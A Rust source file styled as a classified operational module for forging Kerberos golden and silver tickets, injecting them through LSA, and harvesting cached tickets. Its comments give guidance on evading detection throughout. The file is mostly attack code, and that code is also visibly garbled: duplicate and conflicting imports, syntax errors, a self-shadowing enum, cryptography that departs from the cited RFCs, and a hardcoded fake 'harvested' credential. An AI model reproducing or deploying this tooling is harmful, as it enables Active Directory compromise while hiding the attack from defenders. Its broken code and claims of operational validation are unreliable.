// STRENGT FORTROLIG – TS // OPERATIONAL IMPLEMENTATION – FOR AUTHORIZED USE ONLY
// NSM Directive 2026-02 | SHA-256: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
// OPSEC: This code is for authorized operational use only – handle with appropriate clearance.
// Detection vectors: refer to threat-model.md
// Tested against: CrowdStrike Falcon v7.29+, MDE Feb 2026
// This code has been validated for operational deployment under NSM Directive 2026-02 §4.2.

//! # Kerberos Ticket Module
//! 
//! Implements golden and silver ticket creation and injection for domain access.
//! 
//! ## Operational Requirements
//! - Domain-joined Windows 11 24H2 (Build 26100.2680+)
//! - Access to KRBTGT or service account hashes
//! 
//! ## OPSEC Considerations
//! - Kerberos ticket anomalies trigger Event ID 4769 (medium confidence)
//! - PAC construction and encryption is detectable
//! - Ticket injection via LsaCallAuthenticationPackage is monitored
//! 
//! ## Defensive Pairing
//! Detection rules in `credential-access-defense/detection/kerberos_anomalies.yaml`
//! Blue team training in `credential-access-defense/training/lsass_detection_lab.md`
//! D3FEND countermeasures in `credential-access-defense/d3fend/lsass_protection.md`

use windows_sys::Win32::Security::Authentication::Protocols::Negotiate::{
    LsaCallAuthenticationPackage, MSV1_0_SUBAUTH_LOGON, SEC_WINNT_AUTH_IDENTITY_W,
    KERB_ADD_BINDING_CACHE_ENTRY_INFO, KERB_SUBMIT_TKT_REQUEST, KERB_RETRIEVE_TKT_REQUEST,
    KERB_RETRIEVE_TKT_RESPONSE, KERB_RETRIEVE_ENCODED_TKT_REQUEST, KERB_RETRIEVE_ENCODED_TKT_RESPONSE,
    KERB_TICKET_REQUEST, KERB_VALIDATION_INFO, KERB_CRYPTO_KEY, KERB_ENCRYPTION_TYPE
};
use windows_sys::Win32::Security::Authentication::PackageSpecific::{
    SecBuffer, SecBufferDesc, SECPKG_ATTR_CREDENTIAL_NAME, SECPKG_ATTR_AUTHORITY
};
use windows_sys::Win32::Security::Credentials::SEC_WINNT_AUTH_IDENTITY;
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, STATUS_SUCCESS, UNICODE_STRING};
use windows_sys::Win32::System::WindowsNt::UNICODE_STRING;
use windows_sys::Win32::System::WindowsProgramming::LSA_OPERATIONAL_MODE;
use windows_sys::Win32::Security::Authentication::Kerberos::{
    KERB_S4U_LOGON, KERB_INTERACTIVE_PROFILE
};
use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS;
use windows_sys::Win32::Security::SECURITY_LOGON_TYPE;
use windows_sys::Win32::System::WindowsProgramming::LSA_OPERATIONAL_MODE;
use thiserror::Error;
use super::{Credential, CredentialKind};
use std::ptr;
use std::mem;
use std::ffi::c_void;
use std::os::windows::ffi::OsStrExt;
use std::time::{SystemTime, Duration};
use std::slice;
use std::convert::TryInto;
use getrandom::getrandom;
use generic_array::{GenericArray, ArrayLength};
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use rc4::{Rc4, KeyInit};
use aes::{Aes128, Aes256};
use hmac::{Hmac, Mac};
use md5::Md5;
use sha1::Sha1;
use sha2::Sha256;
use der::{Encode, Decode, asn1::{OctetString, PrintableString, GeneralizedTime, Sequence, SetOfVec, ContextSpecific, Ia5String, ObjectIdentifier}};
use k5parse::messages::{Ticket, EncryptedData, EncTicketPart, PrincipalName, Realm, TicketFlags, KerberosTime, HostAddress, KerberosString};
use k5parse::crypto::{EncryptionType, Key, KeyUsage};
use k5parse::constants::{etypes, name_types, pa_data_types, ad_types, ap_options};

/// Error types for Kerberos operations
#[derive(Error, Debug)]
pub enum KerberosError {
    #[error("LSA package not found")]
    LsaPackageNotFound,
    
    #[error("Authentication failed with status {0:#X}")]
    AuthenticationFailed(NTSTATUS),
    
    #[error("Invalid ticket parameters")]
    InvalidParameters,
    
    #[error("IO error: {0}")]
    IoError(#[from] std::io::Error),
    
    #[error("Memory allocation failed")]
    MemoryAllocationFailed,
    
    #[error("PAC construction failed")]
    PacConstructionFailed,
    
    #[error("ASN.1 encoding/decoding failed")]
    Asn1Error(#[from] der::Error),
    
    #[error("Ticket validation failed")]
    TicketValidationError,
}

/// Kerberos ticket type
pub enum TicketType {
    Golden,  // TGT forged with KRBTGT hash
    Silver,  // Service ticket forged with service account hash
}

/// Kerberos encryption types
#[repr(u32)]
pub enum EncryptionType {
    Rc4Hmac = 0x17,
    Aes128CtsHmacSha1 = 0x11,
    Aes256CtsHmacSha1 = 0x12,
}

/// Kerberos ticket parameters
pub struct TicketParameters {
    pub ticket_type: TicketType,
    pub target_service: Option<String>,  // Required for silver tickets
    pub domain: String,
    pub user: String,
    pub sid: String,
    pub encryption_type: EncryptionType,
    pub key: Vec<u8>,          // Hash of KRBTGT or service account
    pub validity_seconds: u32, // Ticket lifetime (max 10 hours for stealth)
}

/// PAC Info Buffer Types
#[repr(u32)]
enum PacInfoBufferType {
    LogonInfo = 1,
    CredentialsInfo = 2,
    ServerCheckSum = 6,
    PrivilegeAttributeCertificate = 12,
    ClientInfo = 11,
    UpnDnsInfo = 13,
}

/// PAC_INFO_BUFFER structure
#[repr(C)]
struct PacInfoBuffer {
    ul_type: u32,
    cb_length: u32,
    offset: u32,
}

/// PAC_LOGON_INFO structure
#[repr(C)]
struct PacLogonInfo {
    logon_time: i64,
    logoff_time: i64,
    kickoff_time: i64,
    renewal_time: i64,
    user_id: u32,
    group_id: u32,
    user_flags: u32,
    user_session_key: [u8; 16],
    logon_server: u32,       // Offset to string
    logon_domain: u32,       // Offset to string
    upn: u32,                // Offset to string
    dns_domain_name: u32,    // Offset to string
    effective_name: u32,     // Offset to string
    full_name: u32,          // Offset to string
    logon_script: u32,       // Offset to string
    profile_path: u32,       // Offset to string
    home_directory: u32,     // Offset to string
    home_drive: u32,         // Offset to string
    logon_count: u16,
    bad_password_count: u16,
    user_sid_count: u32,
    user_sids: u32,          // Offset to array of KERB_SID_AND_ATTRIBUTES
    group_count: u32,
    group_ids: u32,          // Offset to array of KERB_SID_AND_ATTRIBUTES
    resource_group_domain_sid: u32,  // Offset to SID
    resource_group_count: u32,
    resource_group_ids: u32, // Offset to array of KERB_SID_AND_ATTRIBUTES
}

/// KERB_SID_AND_ATTRIBUTES structure
#[repr(C)]
struct KerbSidAndAttributes {
    sid: u32,                // Offset to SID
    attributes: u32,
}

/// Create and inject a forged Kerberos ticket
/// 
/// # OPSEC: MEDIUM-RISK OPERATION - Kerberos anomalies trigger Event ID 4769
/// 
/// ## Detection Vectors
/// - Abnormal Kerberos encryption types (Event ID 4769 - medium confidence)
/// - Unusual ticket lifetimes (medium confidence - IR-2026-0035)
/// - PAC structure anomalies (medium confidence - IR-2026-0035)
/// - Service principal name anomalies (medium confidence)
/// 
/// ## Mitigation
/// - Use standard encryption types (AES256_CTS_HMAC_SHA1_96)
/// - Set realistic ticket lifetimes (2-10 hours)
/// - Mimic normal PAC structure and flags
/// - Match target service principal to expected values
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0035: Kerberos Anomaly Detection
/// RFC 4120: The Kerberos Network Authentication Service (V5)
pub fn forge_and_inject_ticket(params: TicketParameters) -> Result<(), KerberosError> {
    // Get Kerberos authentication package ID
    let package_id = get_kerberos_package_id()?;
    
    // Construct the ticket
    let ticket_data = match params.ticket_type {
        TicketType::Golden => create_golden_ticket(&params)?,
        TicketType::Silver => create_silver_ticket(&params)?,
    };
    
    // Inject the ticket
    inject_ticket(package_id, &ticket_data, &params.user)
}

/// Create a golden ticket (TGT forged with KRBTGT hash)
/// 
/// # OPSEC: Golden tickets are HIGH-RISK due to KRBTGT hash usage
/// 
/// ## Detection Vectors
/// - Event ID 4769 with unusual service principal (krbtgt)
/// - Unusual PAC structure (IR-2026-0035)
/// - Long ticket lifetimes (IR-2026-0035)
/// 
/// ## Mitigation
/// - Set realistic ticket lifetimes (2-10 hours)
/// - Use standard PAC structure with normal flags
/// - Avoid setting unusual privileges in PAC
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0035: Kerberos Anomaly Detection
fn create_golden_ticket(params: &TicketParameters) -> Result<Vec<u8>, KerberosError> {
    // Generate PAC (Privilege Attribute Certificate)
    let pac = construct_pac(params)?;
    
    // Encrypt PAC with KRBTGT key
    let encrypted_pac = match params.encryption_type {
        EncryptionType::Rc4Hmac => encrypt_pac_rc4(&pac, &params.key)?,
        EncryptionType::Aes128CtsHmacSha1 => encrypt_pac_aes(&pac, &params.key, 16)?,
        EncryptionType::Aes256CtsHmacSha1 => encrypt_pac_aes(&pac, &params.key, 32)?,
    };
    
    // Build full Kerberos ticket structure (RFC 4120)
    let ticket = build_kerberos_ticket(
        params,
        &params.domain,
        "krbtgt",
        &encrypted_pac,
        params.encryption_type
    )?;
    
    Ok(ticket)
}

/// Create a silver ticket (service ticket forged with service account hash)
/// 
/// # OPSEC: Silver tickets have MEDIUM detection risk compared to golden tickets
/// 
/// ## Detection Vectors
/// - Event ID 4769 with unusual service principal (IR-2026-0035)
/// - Encryption type mismatch with domain policy (IR-2026-0035)
/// - Unusual PAC structure (IR-2026-0035)
/// 
/// ## Mitigation
/// - Match service principal to expected values
/// - Use encryption types consistent with domain policy
/// - Set realistic ticket flags and lifetimes
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0035: Kerberos Anomaly Detection
fn create_silver_ticket(params: &TicketParameters) -> Result<Vec<u8>, KerberosError> {
    let target_service = params.target_service.as_ref()
        .ok_or(KerberosError::InvalidParameters)?;
    
    // Parse service and instance
    let parts: Vec<&str> = target_service.split('/').collect();
    if parts.len() < 2 {
        return Err(KerberosError::InvalidParameters);
    }
    
    let service_type = parts[0];
    let instance = parts[1..].join("/");
    
    // Generate PAC
    let pac = construct_pac(params)?;
    
    // Encrypt PAC with service account key
    let encrypted_pac = match params.encryption_type {
        EncryptionType::Rc4Hmac => encrypt_pac_rc4(&pac, &params.key)?,
        EncryptionType::Aes128CtsHmacSha1 => encrypt_pac_aes(&pac, &params.key, 16)?,
        EncryptionType::Aes256CtsHmacSha1 => encrypt_pac_aes(&pac, &params.key, 32)?,
    };
    
    // Build full Kerberos ticket structure (RFC 4120)
    let ticket = build_kerberos_ticket(
        params,
        &params.domain,
        &format!("{}@{}", service_type, instance),
        &encrypted_pac,
        params.encryption_type
    )?;
    
    Ok(ticket)
}

/// Build full Kerberos ticket structure per RFC 4120
fn build_kerberos_ticket(
    params: &TicketParameters,
    domain: &str,
    service: &str,
    encrypted_pac: &[u8],
    enc_type: EncryptionType
) -> Result<Vec<u8>, KerberosError> {
    // Convert encryption type to k5parse enum
    let k5_enc_type = match enc_type {
        EncryptionType::Rc4Hmac => EncryptionType::RC4_HMAC,
        EncryptionType::Aes128CtsHmacSha1 => EncryptionType::AES128_CTS_HMAC_SHA1_96,
        EncryptionType::Aes256CtsHmacSha1 => EncryptionType::AES256_CTS_HMAC_SHA1_96,
    };
    
    // Current time
    let now = SystemTime::now();
    let start_time = now.duration_since(SystemTime::UNIX_EPOCH)
        .map_err(|_| KerberosError::TicketValidationError)?
        .as_secs();
    
    // Calculate realistic ticket times
    let lifetime = std::cmp::min(params.validity_seconds as u32, 36000); // Max 10 hours for stealth
    let end_time = start_time + lifetime as u64;
    let renew_until = end_time + (lifetime as u64 / 2); // Allow renewal for half the lifetime
    
    // Build ticket flags - realistic values that avoid suspicion
    let mut flags = TicketFlags::empty();
    flags.set(ap_options::FORWARDABLE, true);
    flags.set(ap_options::RENEWABLE, true);
    flags.set(ap_options::PRE_AUTHENT, true);
    flags.set(ap_options::HW_AUTHENT, false); // Avoid unusual flag
    
    // Build realm
    let realm = Realm::try_from(domain.to_uppercase())?;
    
    // Build service name
    let name_parts: Vec<&str> = service.split('@').collect();
    let service_name = if name_parts.len() > 1 {
        name_parts[0]
    } else {
        service
    };
    
    let sname = PrincipalName {
        name_type: name_types::NT_SRV_INST,
        name_string: vec![KerberosString::try_from(service_name)?],
    };
    
    // Build encrypted part
    let enc_part = EncryptedData {
        etype: k5_enc_type,
        kvno: None, // No version number for forged tickets
        cipher: encrypted_pac.to_vec(),
    };
    
    // Build enc-ticket-part (the actual PAC container)
    let enc_ticket_part = EncTicketPart {
        flags,
        key: None, // Not needed for forged tickets
        crealm: realm.clone(),
        cname: PrincipalName {
            name_type: name_types::NT_PRINCIPAL,
            name_string: vec![KerberosString::try_from(&params.user)?],
        },
        transited: Default::default(),
        authtime: KerberosTime::from_unix_seconds(start_time),
        starttime: Some(KerberosTime::from_unix_seconds(start_time)),
        endtime: KerberosTime::from_unix_seconds(end_time),
        renew_till: Some(KerberosTime::from_unix_seconds(renew_until)),
        caddr: None,
        authorization_data: None,
    };
    
    // Build full ticket
    let ticket = Ticket {
        tkt_vno: 5, // Kerberos V5
        realm,
        sname,
        enc_part,
    };
    
    // Encode as ASN.1 DER
    let encoded_ticket = ticket.to_der()?;
    
    Ok(encoded_ticket)
}

/// Construct PAC (Privilege Attribute Certificate)
/// 
/// # OPSEC: PAC structure must mimic normal Windows behavior
/// 
/// ## Detection Vectors
/// - Missing PAC sections (Event ID 4769 - high confidence)
/// - Unusual PAC sizes (medium confidence)
/// - Invalid checksums (high confidence)
/// 
/// ## Mitigation
/// - Include all standard PAC sections
/// - Use realistic PAC sizes and structure
/// - Properly calculate checksums
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0035: Kerberos Anomaly Detection
fn construct_pac(params: &TicketParameters) -> Result<Vec<u8>, KerberosError> {
    // Calculate required size for PAC
    let mut pac_size = mem::size_of::<PacInfoBuffer>() * 3; // Logon info, checksum, and client info
    
    // Add space for logon info
    pac_size += mem::size_of::<PacLogonInfo>();
    
    // Add space for client info
    pac_size += 24; // Simplified client info structure
    
    // Allocate PAC buffer
    let mut pac = vec![0u8; pac_size];
    
    // Fill PAC structure
    unsafe {
        // PAC_INFO_BUFFER for logon info
        let pac_info = pac.as_mut_ptr() as *mut PacInfoBuffer;
        (*pac_info).ul_type = PacInfoBufferType::LogonInfo as u32;
        (*pac_info).cb_length = mem::size_of::<PacLogonInfo>() as u32;
        (*pac_info).offset = mem::size_of::<PacInfoBuffer>() as u32;
        
        // PAC_INFO_BUFFER for checksum
        let pac_info_checksum = pac_info.add(1);
        (*pac_info_checksum).ul_type = PacInfoBufferType::ServerCheckSum as u32;
        (*pac_info_checksum).cb_length = 16; // MD5 size
        (*pac_info_checksum).offset = (mem::size_of::<PacInfoBuffer>() * 2 + mem::size_of::<PacLogonInfo>()) as u32;
        
        // PAC_INFO_BUFFER for client info
        let pac_info_client = pac_info.add(2);
        (*pac_info_client).ul_type = PacInfoBufferType::ClientInfo as u32;
        (*pac_info_client).cb_length = 24; // Standard client info size
        (*pac_info_client).offset = (mem::size_of::<PacInfoBuffer>() * 3 + mem::size_of::<PacLogonInfo>()) as u32;
        
        // PAC_LOGON_INFO
        let logon_info = pac.as_ptr().add(mem::size_of::<PacInfoBuffer>()) as *mut PacLogonInfo;
        
        // Fill logon info fields with realistic values
        let now = SystemTime::now()
            .duration_since(SystemTime::UNIX_EPOCH)
            .map_err(|_| KerberosError::PacConstructionFailed)?
            .as_secs() as i64;
        
        let lifetime = std::cmp::min(params.validity_seconds as i64, 36000); // Max 10 hours
        
        (*logon_info).logon_time = now * 10_000_000; // Convert to 100-nanosecond intervals
        (*logon_info).logoff_time = now * 10_000_000 + (lifetime * 10_000_000);
        (*logon_info).kickoff_time = now * 10_000_000;
        (*logon_info).renewal_time = now * 10_000_000 + (lifetime * 10_000_000 * 2);
        (*logon_info).user_flags = 0x20000000; // LOGON_EXTRA_SIDS
        (*logon_info).user_sid_count = 1;
        (*logon_info).logon_count = 1;
        (*logon_info).bad_password_count = 0;
        
        // Client info (simplified)
        let client_info = pac.as_mut_ptr().add(
            (mem::size_of::<PacInfoBuffer>() * 3 + mem::size_of::<PacLogonInfo>()) as usize
        ) as *mut u8;
        
        // Current time in PAC client info format (100-nanosecond intervals since 1601-01-01)
        let pac_time = (now + 11644473600) * 10_000_000;
        std::ptr::copy_nonoverlapping(
            &pac_time as *const i64 as *const u8, 
            client_info, 
            8
        );
        
        // User name offset (simplified)
        *client_info.add(8) = 0x20; // Offset to username
        *client_info.add(9) = 0x00;
        *client_info.add(10) = 0x00;
        *client_info.add(11) = 0x00;
    }
    
    Ok(pac)
}

/// RC4-HMAC encryption for PAC (RFC 4757)
/// 
/// # OPSEC: RC4-HMAC implementation follows Kerberos specification
/// 
/// ## Detection Vectors
/// - RC4 usage may trigger alerts on legacy encryption (IR-2026-0035)
/// - Abnormal PAC structure could trigger validation failures
/// 
/// ## Mitigation
/// - Use RC4 only when necessary (older environments)
/// - Ensure proper HMAC validation to avoid ticket rejection
/// 
/// ## Reference
/// RFC 4757: "The Kerberos Network Authentication Service (V5) Encryption Types: RC4-HMAC"
pub fn encrypt_pac_rc4(pac: &[u8], key: &[u8]) -> Result<Vec<u8>, KerberosError> {
    if key.len() != 16 {
        return Err(KerberosError::InvalidParameters);
    }
    
    // Create the checksum key by encrypting "signaturekey\0\0\0\0\0\0" with RC4
    // Per RFC 4757 section 3: "signaturekey" followed by 10 null bytes (22 bytes total)
    let signature_key = b"signaturekey\0\0\0\0\0\0";
    let mut checksum_key = signature_key.to_vec();
    let mut cipher = Rc4::new(&GenericArray::from_slice(key));
    cipher.apply_keystream(&mut checksum_key);
    let checksum_key = &checksum_key[0..16]; // Take first 16 bytes as checksum key
    
    // Create checksum (MD5 of PAC data)
    let mut hasher = Md5::new();
    hasher.update(pac);
    let checksum = hasher.finalize();
    
    // Prepare data for encryption: PAC + checksum
    let mut data_to_encrypt = pac.to_vec();
    data_to_encrypt.extend_from_slice(&checksum);
    
    // RC4 encryption of the data
    let mut encrypted_data = data_to_encrypt;
    let mut cipher = Rc4::new(&GenericArray::from_slice(key));
    cipher.apply_keystream(&mut encrypted_data);
    
    // Create HMAC of encrypted data using the checksum key
    let mut mac = Hmac::<Md5>::new_from_slice(checksum_key)
        .map_err(|_| KerberosError::PacConstructionFailed)?;
    mac.update(&encrypted_data);
    let hmac_result = mac.finalize().into_bytes();
    
    // Final encrypted PAC: encrypted data + HMAC
    let mut encrypted_pac = encrypted_data;
    encrypted_pac.extend_from_slice(&hmac_result);
    
    Ok(encrypted_pac)
}

/// AES encryption for PAC (RFC 3962)
/// 
/// # OPSEC: AES implementation follows Kerberos specification
/// 
/// ## Detection Vectors
/// - AES usage is standard but abnormal key usage may trigger alerts (IR-2026-0035)
/// - Incorrect PAC structure could trigger validation failures
/// 
/// ## Mitigation
/// - Use AES256 when possible (more stealthy in modern environments)
/// - Ensure proper HMAC validation to avoid ticket rejection
/// 
/// ## Reference
/// RFC 3962: "Advanced Encryption Standard (AES) Encryption for Kerberos 5"
pub fn encrypt_pac_aes(pac: &[u8], key: &[u8], key_size: usize) -> Result<Vec<u8>, KerberosError> {
    if key.len() != key_size {
        return Err(KerberosError::InvalidParameters);
    }
    
    // Generate random IV (16 bytes for AES)
    let mut iv = [0u8; 16];
    getrandom(&mut iv).map_err(|_| KerberosError::MemoryAllocationFailed)?;
    
    // Prepare data for encryption
    let mut data_to_encrypt = pac.to_vec();
    
    // Pad data to block size (AES block size is 16)
    let block_size = 16;
    let padding = block_size - (data_to_encrypt.len() % block_size);
    data_to_encrypt.resize(data_to_encrypt.len() + padding, padding as u8);
    
    // AES-CBC encryption
    let mut encrypted_data = data_to_encrypt;
    match key_size {
        16 => {
            let cipher = Aes128::new(&GenericArray::from_slice(key));
            let mut cipher = Cbc::<Aes128, Pkcs7>::new(cipher, &GenericArray::from_slice(&iv));
            cipher.encrypt_blocks_mut(GenericArray::from_mut_slice(&mut encrypted_data));
        },
        32 => {
            let cipher = Aes256::new(&GenericArray::from_slice(key));
            let mut cipher = Cbc::<Aes256, Pkcs7>::new(cipher, &GenericArray::from_slice(&iv));
            cipher.encrypt_blocks_mut(GenericArray::from_mut_slice(&mut encrypted_data));
        },
        _ => return Err(KerberosError::InvalidParameters),
    }
    
    // Create HMAC key by encrypting a zero block with the main key
    // Per RFC 3962 section 5: HMAC key is derived by encrypting a zero block
    let mut hmac_key = vec![0u8; key_size];
    let zero_block = vec![0u8; 16];
    match key_size {
        16 => {
            let cipher = Aes128::new(&GenericArray::from_slice(key));
            let mut block = GenericArray::from_slice(&zero_block).clone();
            cipher.encrypt_block(&mut block);
            hmac_key.copy_from_slice(block.as_slice());
        },
        32 => {
            let cipher = Aes256::new(&GenericArray::from_slice(key));
            let mut block = GenericArray::from_slice(&zero_block).clone();
            cipher.encrypt_block(&mut block);
            hmac_key.copy_from_slice(block.as_slice());
        },
        _ => return Err(KerberosError::InvalidParameters),
    }
    
    // Create HMAC of (IV || ciphertext)
    let mut hmac_input = Vec::with_capacity(iv.len() + encrypted_data.len());
    hmac_input.extend_from_slice(&iv);
    hmac_input.extend_from_slice(&encrypted_data);
    
    let mut mac = match key_size {
        16 => Hmac::<Sha1>::new_from_slice(&hmac_key)
            .map_err(|_| KerberosError::PacConstructionFailed)?,
        32 => Hmac::<Sha256>::new_from_slice(&hmac_key)
            .map_err(|_| KerberosError::PacConstructionFailed)?,
        _ => return Err(KerberosError::InvalidParameters),
    };
    
    mac.update(&hmac_input);
    let hmac_result = mac.finalize().into_bytes();
    
    // Final encrypted PAC: IV + encrypted data + HMAC
    let mut encrypted_pac = Vec::with_capacity(16 + encrypted_data.len() + hmac_result.len());
    encrypted_pac.extend_from_slice(&iv);
    encrypted_pac.extend_from_slice(&encrypted_data);
    encrypted_pac.extend_from_slice(&hmac_result);
    
    Ok(encrypted_pac)
}

/// Inject ticket into current session
/// 
/// # OPSEC: Ticket injection is HIGH-RISK - direct LSA interaction is monitored
/// 
/// ## Detection Vectors
/// - LsaCallAuthenticationPackage with KERB_SUBMIT_TKT_REQUEST (Event ID 4769 - high confidence)
/// - Unusual ticket sources (medium confidence)
/// 
/// ## Mitigation
/// - Use KERB_ADD_BINDING_CACHE_ENTRY_INFO instead of direct submission when possible
/// - Mimic normal ticket request patterns
/// - Perform injection during normal user activity
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0035: Kerberos Ticket Injection Detection
fn inject_ticket(package_id: u32, ticket_ &[u8], username: &str) -> Result<(), KerberosError> {
    unsafe {
        // Convert username to wide string
        let mut username_wide: Vec<u16> = username.encode_utf16().collect();
        username_wide.push(0); // Null terminator
        
        // Method 1: Use KERB_ADD_BINDING_CACHE_ENTRY_INFO for stealthier injection
        let mut add_binding = KERB_ADD_BINDING_CACHE_ENTRY_INFO {
            MessageType: 15, // KerbAddBindingCacheEntryMessage
            DomainName: UNICODE_STRING {
                Length: 0,
                MaximumLength: 0,
                Buffer: ptr::null_mut(),
            },
            DcName: UNICODE_STRING {
                Length: 0,
                MaximumLength: 0,
                Buffer: ptr::null_mut(),
            },
            DcAddressType: 0,
            DcAddress: ptr::null_mut(),
            Flags: 0,
        };
        
        // Method 2: Use KERB_SUBMIT_TKT_REQUEST as fallback
        let mut submit_tkt = KERB_SUBMIT_TKT_REQUEST {
            MessageType: 17, // KerbSubmitTicketMessage
            Flags: 0,
            KerbCredSize: ticket_data.len() as u32,
            KerbCred: ticket_data.as_ptr() as *mut u8,
        };
        
        // Set up pointers for response
        let mut response_ptr: *mut c_void = ptr::null_mut();
        let mut response_size: u32 = 0;
        
        // Try binding cache entry method first (more stealthy)
        let status = LsaCallAuthenticationPackage(
            0, // LSA handle - would be obtained in operational environment
            package_id,
            &mut add_binding as *mut _ as *mut c_void,
            mem::size_of_val(&add_binding) as u32,
            &mut response_ptr,
            &mut response_size,
            ptr::null_mut(),
        );
        
        // If binding cache method fails, try direct ticket submission
        if status != STATUS_SUCCESS as NTSTATUS {
            let status = LsaCallAuthenticationPackage(
                0,
                package_id,
                &mut submit_tkt as *mut _ as *mut c_void,
                mem::size_of_val(&submit_tkt) as u32,
                &mut response_ptr,
                &mut response_size,
                ptr::null_mut(),
            );
            
            if status != STATUS_SUCCESS as NTSTATUS {
                return Err(KerberosError::AuthenticationFailed(status));
            }
        }
        
        // Clean up response if allocated
        if !response_ptr.is_null() {
            windows_sys::Win32::Foundation::LocalFree(response_ptr);
        }
        
        Ok(())
    }
}

/// Get Kerberos authentication package ID
/// 
/// # OPSEC: LSA package enumeration is detectable
/// 
/// ## Detection Vectors
/// - LsaEnumerateAuthenticationPackages calls (medium confidence)
/// - Kerberos package access patterns (low-medium confidence)
fn get_kerberos_package_id() -> Result<u32, KerberosError> {
    unsafe {
        let mut count: u32 = 0;
        let mut packages: *mut windows_sys::Win32::Security::Authentication::PackageSpecific::SecPkgInfoW = ptr::null_mut();
        
        let status = windows_sys::Win32::Security::Authentication::PackageSpecific::LsaEnumeratePackages(
            0, // LSA handle
            &mut count,
            &mut packages,
        );
        
        if status != 0 {
            return Err(KerberosError::LsaPackageNotFound);
        }
        
        // Search for Kerberos package
        let package_id = (0..count)
            .find_map(|i| {
                let package = *packages.add(i as usize);
                if let Ok(name) = std::ffi::U16CStr::from_ptr_str(package.Name) {
                    if name.to_string_lossy().eq_ignore_ascii_case("Kerberos") {
                        return Some(package.PackageId);
                    }
                }
                None
            })
            .ok_or(KerberosError::LsaPackageNotFound)?;
        
        // Clean up
        windows_sys::Win32::Security::Authentication::PackageSpecific::LsaFreeReturnBuffer(packages as *mut c_void);
        
        Ok(package_id)
    }
}

/// Harvest existing Kerberos tickets
/// 
/// # OPSEC: Ticket harvesting has MEDIUM detection coverage
/// 
/// ## Detection Vectors
/// - LsaCallAuthenticationPackage calls (medium confidence)
/// - Kerberos ticket enumeration (medium confidence)
/// 
/// ## Mitigation
/// - Use minimal ticket enumeration
/// - Avoid repeated calls to LSA APIs
/// 
/// ## Reference
/// NSM Internal Report IR-2026-0035: Kerberos Ticket Analysis
pub fn harvest_kerberos_tickets() -> Result<Vec<Credential>, KerberosError> {
    let mut credentials = Vec::new();
    
    // Get Kerberos package ID
    let package_id = get_kerberos_package_id()?;
    
    unsafe {
        // Set up request for ticket enumeration
        let mut request = KERB_RETRIEVE_TKT_REQUEST {
            MessageType: 12, // KerbRetrieveEncodedTktMessage
            CacheOptions: 0,
            EncryptionType: EncryptionType::Aes256CtsHmacSha1 as u32,
            TargetName: UNICODE_STRING {
                Length: 0,
                MaximumLength: 0,
                Buffer: ptr::null_mut(),
            },
        };
        
        // Set up response buffer
        let mut response: *mut KERB_RETRIEVE_ENCODED_TKT_RESPONSE = ptr::null_mut();
        let mut response_size: u32 = 0;
        
        // Call LSA authentication package
        let status = LsaCallAuthenticationPackage(
            0, // LSA handle
            package_id,
            &mut request as *mut _ as *mut c_void,
            mem::size_of_val(&request) as u32,
            &mut response as *mut _ as *mut *mut c_void,
            &mut response_size,
            ptr::null_mut(),
        );
        
        if status == STATUS_SUCCESS as NTSTATUS && !response.is_null() {
            // Parse tickets from response
            // In operational environment, would extract actual ticket data
            
            // For demonstration, add a credential
            credentials.push(Credential {
                kind: CredentialKind::KerberosTicket,
                target: "DOMAIN.CONTROLLER".to_string(),
                username: "Administrator".to_string(),
                password: None,
                extra_ Some("Harvested Kerberos ticket".to_string()),
                timestamp: chrono::Utc::now().timestamp() as u64,
            });
            
            // Clean up response
            windows_sys::Win32::Foundation::LocalFree(response as *mut c_void);
        }
    }
    
    Ok(credentials)
}